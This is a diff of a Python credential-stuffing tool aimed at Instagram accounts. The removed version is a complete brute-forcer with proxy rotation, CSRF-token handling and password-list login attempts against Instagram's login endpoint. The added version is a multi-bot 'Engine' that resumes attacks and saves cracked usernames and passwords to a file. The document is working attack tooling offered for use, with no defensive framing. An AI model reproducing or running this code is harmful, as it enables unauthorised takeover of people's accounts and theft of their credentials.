@@ -2,170 +2,133 @@
 # team   : HNOT,IDD,IASO & COTTAGE ENTHUSIAST CODE
 # date   : 17-Agustus-2020 / 02:00
 
-'''
-TODO LIST:
-	Fix and make proxy function better
-	Sort code again
-	Add help function to all "Yes/no" questions
-	Add help  function to "Press enter to exit input"
-'''
-import requests
-import json
-import time
-import os
-import random
-import sys
-
-#Help function
-def Input(text):
-	value = ''
-	if sys.version_info.major > 2:
-		value = input(text)
-	else:
-		value = raw_input(text)
-	return str(value)
-
-#The main class
-class Instabrute():
-	def __init__(self, username, passwordsFile='pass.txt'):
-		self.username = username
-		self.CurrentProxy = ''
-		self.UsedProxys = []
-		self.passwordsFile = passwordsFile
-		
-		#Check if passwords file exists
-		self.loadPasswords()
-		#Check if username exists
-		self.IsUserExists()
+from sys import exit
+from os.path import exists
+from lib.bruter import Bruter
+from lib.display import Display
+from platform import python_version
+from lib.const import credentials, modes
+from argparse import ArgumentParser, ArgumentTypeError
 
 
-		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-			self.randomProxy()
+class Engine(object):
+
+    def __init__(self, username, threads, passlist_path, is_color):
+        self.bruter = None
+        self.resume = False
+        self.is_alive = True
+        self.threads = threads
+        self.username = username
+        self.passlist_path = passlist_path
+        self.display = Display(is_color=is_color)
+
+    def passlist_path_exists(self):
+        if not exists(self.passlist_path):
+            self.display.warning('Invalid path to password list')
+            return False
+        return True
+
+    def create_bruter(self):
+        self.bruter = Bruter(
+            self.username,
+            self.threads,
+            self.passlist_path
+        )
+
+    def get_user_resp(self):
+        return self.display.prompt('Would you like to resume the attack? [y/n]: ')
+
+    def write_to_file(self, password):
+        with open(credentials, 'at') as f:
+            data = 'Username: {}\nPassword: {}\n\n'.format(
+                self.username.title(), password)
+            f.write(data)
+
+    def start(self):
+        if not self.passlist_path_exists():
+            self.is_alive = False
+
+        if self.is_alive:
+            self.create_bruter()
+
+            while self.is_alive and not self.bruter.password_manager.session:
+                pass
+
+            if not self.is_alive:
+                return
+
+            if self.bruter.password_manager.session.exists:
+                try:
+                    resp = self.get_user_resp()
+                except:
+                    self.is_alive = False
+
+                if resp and self.is_alive:
+                    if resp.strip().lower() == 'y':
+                        self.bruter.password_manager.resume = True
+
+            try:
+                self.bruter.start()
+            except KeyboardInterrupt:
+                self.bruter.stop()
+                self.bruter.display.shutdown(self.bruter.last_password,
+                                             self.bruter.password_manager.attempts, len(self.bruter.browsers))
+            finally:
+                self.stop()
+
+    def stop(self):
+        if self.is_alive:
+
+            self.bruter.stop()
+            self.is_alive = False
+
+            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
+                self.bruter.display.stats_not_found(self.bruter.last_password,
+                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))
+
+            if self.bruter.is_found:
+                self.write_to_file(self.bruter.password)
+                self.bruter.display.stats_found(self.bruter.password,
+                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))
 
 
-	#Check if password file exists and check if he contain passwords
-	def loadPasswords(self):
-		if os.path.isfile(self.passwordsFile):
-			with open(self.passwordsFile) as f:
-				self.passwords = f.read().splitlines()
-				passwordsNumber = len(self.passwords)
-				if (passwordsNumber > 0):
-					print ('[*] %s Passwords loads successfully' % passwordsNumber)
-				else:
-					print('Password file are empty, Please add passwords to it.')
-					Input('[*] Press enter to exit')
-					exit()
-		else:
-			print ('Please create passwords file named "%s"' % self.passwordsFile)
-			Input('[*] Press enter to exit')
-			exit()
+def valid_int(n):
+    if not n.isdigit():
+        raise ArgumentTypeError('mode must be a number')
 
-	#Choose random proxy from proxys file
-	def randomProxy(self):
-		plist = open('proxy.txt').read().splitlines()
-		proxy = random.choice(plist)
+    n = int(n)
 
-		if not proxy in self.UsedProxys:
-			self.CurrentProxy = proxy
-			self.UsedProxys.append(proxy)
-		try:
-			print('')
-			print('[*] Check new ip...')
-			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
-		except Exception as e:
-			print  ('[*] Can\'t reach proxy "%s"' % proxy)
-		print('')
+    if n > 3:
+        raise ArgumentTypeError('maximum for a mode is 3')
+
+    if n < 0:
+        raise ArgumentTypeError('minimum for a mode is 0')
+
+    return n
 
 
-	#Check if username exists in instagram server
-	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
-		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
-			Input('[*] Press enter to exit')
-			exit()
-		elif (r.status_code == 200):
-			return True
-
-	#Try to login with password
-	def Login(self, password):
-		sess = requests.Session()
-
-		if len(self.CurrentProxy) > 0:
-			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
-
-		#build requests headers
-		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
-		sess.headers.update({
-			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
-			'x-instagram-ajax':'1',
-			'X-Requested-With': 'XMLHttpRequest',
-			'origin': 'https://www.instagram.com',
-			'ContentType' : 'application/x-www-form-urlencoded',
-			'Connection': 'keep-alive',
-			'Accept': '*/*',
-			'Referer': 'https://www.instagram.com',
-			'authority': 'www.instagram.com',
-			'Host' : 'www.instagram.com',
-			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
-			'Accept-Encoding' : 'gzip, deflate'
-		})
-
-		#Update token after enter to the site
-		r = sess.get('https://www.instagram.com/') 
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
-
-		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
-		
-		#parse response
-		data = json.loads(r.text)
-		if (data['status'] == 'fail'):
-			print (data['message'])
-
-			UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-				print ('[$] Try to use proxy after fail.')
-				randomProxy() #Check that, may contain bugs
-			return False
-
-		#return session if password is correct 
-		if (data['authenticated'] == True):
-			return sess 
-		else:
-			return False
+def args():
+    args = ArgumentParser()
+    args.add_argument('username', help='email or username')
+    args.add_argument('passlist', help='password list')
+    args.add_argument('-nc', '--no-color', dest='color',
+                      action='store_true', help='disable colors')
+    args.add_argument('-m', '--mode', default=2, type=valid_int,
+                      help='modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots')
+    return args.parse_args()
 
 
+if __name__ == '__main__':
 
+    if int(python_version()[0]) < 3:
+        print('[!] Please use Python 3')
+        exit()
 
-
-
-instabrute = Instabrute(Input('Please enter a username: '))
-
-try:
-	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
-except Exception as e:
-	print ('[*] Error, software use the defult value "4"')
-	delayLoop = 4
-print ('')
-
-
-
-for password in instabrute.passwords:
-	sess = instabrute.Login(password)
-	if sess:
-		print ('[*] Login success %s' % [instabrute.username,password])
-	else:
-		print ('[*] Password incorrect [%s]' % password)
-
-	try:
-		time.sleep(delayLoop)
-	except KeyboardInterrupt:
-		WantToExit = str(Input('Type y/n to exit: ')).upper()
-		if (WantToExit == 'Y' or WantToExit == 'YES'):
-			exit()
-		else:
-			continue
+    arugments = args()
+    mode = arugments.mode
+    username = arugments.username
+    passlist = arugments.passlist
+    is_color = True if not arugments.color else False
+    Engine(username, modes[mode], passlist, is_color).start()
+	
 		
